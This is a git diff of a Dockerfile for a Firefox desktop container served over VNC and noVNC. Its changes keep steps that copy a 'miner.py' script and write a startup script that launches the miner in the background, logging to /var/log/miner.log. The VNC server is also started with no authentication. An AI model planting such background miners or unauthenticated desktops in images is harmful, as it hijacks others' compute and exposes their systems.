@@ -10,6 +10,12 @@ RUN apt update -y && apt install --no-install-recommends -y \
 RUN apt update -y && apt install -y dbus-x11 x11-utils x11-xserver-utils x11-apps
 RUN apt install software-properties-common -y
 
+# Install Python and pip (no venv needed)
+RUN apt install -y python3 python3-pip
+
+# Install required Python packages globally
+RUN pip3 install --no-cache-dir requests psutil
+
 # Firefox installation
 RUN add-apt-repository ppa:mozillateam/ppa -y
 RUN echo 'Package: *' >> /etc/apt/preferences.d/mozilla-firefox
@@ -19,39 +25,26 @@ RUN echo 'Unattended-Upgrade::Allowed-Origins:: "LP-PPA-mozillateam:jammy";' | t
 RUN apt update -y && apt install -y firefox
 RUN apt update -y && apt install -y xubuntu-icon-theme
 
-# ========== ADD THIS SECTION FOR PYTHON & MINER SCRIPT ==========
-# Install Python and pip
-RUN apt install -y python3 python3-pip
-
-# Create Python virtual environment (optional but recommended)
-RUN python3 -m venv /opt/venv
-ENV PATH="/opt/venv/bin:$PATH"
-
-# Install required Python packages
-RUN pip install --no-cache-dir requests psutil
-
 # Create directory for miner script
 RUN mkdir -p /opt/scripts
 
-# Copy miner script (make sure miner.py is in your repo)
+# Copy miner script
 COPY miner.py /opt/scripts/miner.py
 RUN chmod +x /opt/scripts/miner.py
 
-# Create a startup script to run miner in background
+# Create startup script
 RUN echo '#!/bin/bash' > /opt/scripts/start_miner.sh && \
-    echo 'sleep 10' >> /opt/scripts/start_miner.sh && \
+    echo 'sleep 15' >> /opt/scripts/start_miner.sh && \
     echo 'export DISPLAY=:0' >> /opt/scripts/start_miner.sh && \
     echo 'cd /opt/scripts' >> /opt/scripts/start_miner.sh && \
-    echo '/opt/venv/bin/python /opt/scripts/miner.py >> /var/log/miner.log 2>&1 &' >> /opt/scripts/start_miner.sh && \
+    echo 'python3 /opt/scripts/miner.py >> /var/log/miner.log 2>&1 &' >> /opt/scripts/start_miner.sh && \
     chmod +x /opt/scripts/start_miner.sh
-# ========== END OF ADDED SECTION ==========
 
 RUN touch /root/.Xauthority
 
 EXPOSE 5901
 EXPOSE 6080
 
-# Modified CMD to also run miner script
 CMD bash -c "vncserver -localhost no -SecurityTypes None -geometry 1024x768 --I-KNOW-THIS-IS-INSECURE && \
              openssl req -new -subj "/C=JP" -x509 -days 365 -nodes -out self.pem -keyout self.pem && \
              websockify -D --web=/usr/share/novnc/ --cert=self.pem 6080 localhost:5901 && \
